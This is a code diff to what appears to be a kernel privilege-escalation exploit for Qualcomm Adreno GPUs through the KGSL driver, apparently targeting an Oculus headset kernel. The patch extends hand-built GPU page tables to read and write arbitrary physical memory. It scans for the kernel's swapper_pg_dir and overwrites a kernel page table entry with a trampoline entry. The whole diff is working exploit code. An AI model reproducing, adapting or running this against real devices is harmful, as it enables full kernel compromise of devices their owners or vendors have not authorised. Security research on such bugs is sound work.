@@ -174,6 +174,16 @@ int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fa
         level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                 ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                 ENTRY_NG);
+        // hack
+        for (int i = 0; i < 16; i++) {
+            int index = level3_index + 2 + i;
+            if (index == level1_index || index == level2_index || index == level3_index) {
+                return -1;
+            }
+            level_base[index] = (uint64_t) (target_pa + (i*0x1000) | ENTRY_VALID | ENTRY_RW |
+                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
+                ENTRY_NG);
+        }
     }
 
     return 0;
@@ -283,11 +293,20 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
             *drawstate_cmds++ = values[i];
         }
     } else {
-        // only support one 32-bit read for now...
-        *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
-        *drawstate_cmds++ = 0;
-        drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
-        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
+        if (count == 1) {
+            *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
+            *drawstate_cmds++ = 0;
+            drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
+            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
+        } else {
+            // hack...
+            for (int i = 0; i < count; i++) {
+                *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                *drawstate_cmds++ = 0;
+                drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4 + 4*i);
+                drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr + i*0x1000);
+            }
+        }
     }
     *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
     drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
@@ -317,7 +336,6 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     fprintf(stderr, "\n");
 #endif
     sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
-    sleep(1);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -502,21 +520,22 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
     fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);
 
-    uint64_t swapper_pg_dir_physical_address;
+    uint64_t swapper_pg_dir_off;
     if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
-        swapper_pg_dir_physical_address = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
+        swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
     } else {
-        // we need to do one more read.
-        // __create_page_tables: https://github.com/facebookincubator/oculus-linux-kernel/blame/2ec81fa7af4875987bb74ba132661dfb4ade999a/arch/arm64/kernel/head.S#L308
-        // the adrp x0, idmap_pg_dir is always 0x80 bytes after kernel start.
-        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off + 0x80;
+        // there's up to 0xf000 bytes of padding between the end of primary_entry and the start of primary_entry
+        // we need to check all 16 places where swapper_pg_dir could be. Do one read of all 16 locations.
+        // look for idmap_pg_dir's 2nd entry, which is a table entry for 0x80000000-0xc0000000
+        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0xf000 /* max amount of padding */ - 0x6000 /* end to idmap_pg_dir */ + 2*sizeof(uint64_t);
         fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
         if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
             return 1;
         }
         sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
-        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
+        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + 0x2000 + (target_read_physical_address & 0xfffull), 16, NULL)) {
             fprintf(stderr, "Can't do second read\n");
+            return 1;
         }
         sleep(1);
         sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
@@ -527,18 +546,28 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             return 1;
         }
 
-        read_output = *(uint32_t*)(target_physical_page + 0x104);
-        fprintf(stderr, "second read value: %x\n", read_output);
-        if (read_output == 0x45454545) {
-            fprintf(stderr, "Fail\n");
+        for (int i = 15; i >= 0; i--) {
+            read_output = *(uint32_t*)(target_physical_page + 0x104 + i*4);
+            fprintf(stderr, "second read value: %x\n", read_output);
+            if (read_output == 0x45454545) {
+                fprintf(stderr, "Fail\n");
+                return 1;
+            }
+            if ((read_output & 0xfff) == 0x3) {
+                uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
+                swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
+                fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);
+                break;
+            }
+        }
+        if (!swapper_pg_dir_off) {
+            fprintf(stderr, "can't find swapper_pg_dir\n");
             return 1;
         }
-        uint64_t idmap_pg_dir_off = cheese_decode_adrp(read_output, kernel_entry_file_off + 0x80);
-        fprintf(stderr, "idmap_pg_dir_off: %lx\n", idmap_pg_dir_off);
-        swapper_pg_dir_physical_address = kernel_physical_memory_region + idmap_pg_dir_off + 0x5000;
+        sleep(1);
     }
 
-    uint64_t target_write_physical_address = swapper_pg_dir_physical_address + (kKernelPageTableEntry * sizeof(uint64_t));
+    uint64_t target_write_physical_address = kernel_physical_memory_region + swapper_pg_dir_off + (kKernelPageTableEntry * sizeof(uint64_t));
 
     fprintf(stderr, "writing: %lx = %lx\n", target_write_physical_address, tramp_pte_value);
 
@@ -554,16 +583,13 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
     uint32_t second_write_sentinel = *(uint32_t*)(target_physical_page + 0x100);
     fprintf(stderr, "second write sentinel: %x\n", second_write_sentinel);
+    if (second_write_sentinel != 0x41414141) {
+        fprintf(stderr, "second write failed\n");
+    }
 
     // we don't need these anymore...
     for (int i = 0; i < NPBUFS; i++) {
-        void* pbuf = pbufs[i];
-        if (i == target_pbuf) {
-            munmap(pbufs[i], target_physical_page - pbuf);
-            munmap(target_physical_page + 0x1000, (pbuf + pbuf_len) - (target_physical_page + 0x1000));
-        } else {
-            munmap(pbufs[i], pbuf_len);
-        }
+        munmap(pbufs[i], pbuf_len);
         pbufs[i] = NULL;
     }
     return 0;
@@ -714,15 +740,16 @@ int main() {
     sleep(1);
     // stupidest cache flush: write and run 16MB of nops.
     {
-        void* garbage = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
-        uint32_t* garbage_instrs = garbage;
-        for (int i = 0; i < (0x1000000 / 4) - 1; i++) {
+        uint32_t dumb_cache_flush_size = 0x1000000;
+        void* garbage = mmap(NULL, dumb_cache_flush_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+        volatile uint32_t* garbage_instrs = garbage;
+        for (int i = 0; i < (dumb_cache_flush_size / 4) - 1; i++) {
             garbage_instrs[i] = 0xd503201f; // nop
         }
-        garbage_instrs[(0x1000000 / 4) - 1] = 0xD65F03C0; // ret
+        garbage_instrs[(dumb_cache_flush_size / 4) - 1] = 0xD65F03C0; // ret
         void (*garbage_fn)(void) = garbage;
         garbage_fn();
-        munmap(garbage, 0x1000000);
+        munmap(garbage, dumb_cache_flush_size);
     }
 
     fprintf(stderr, "call...\n");
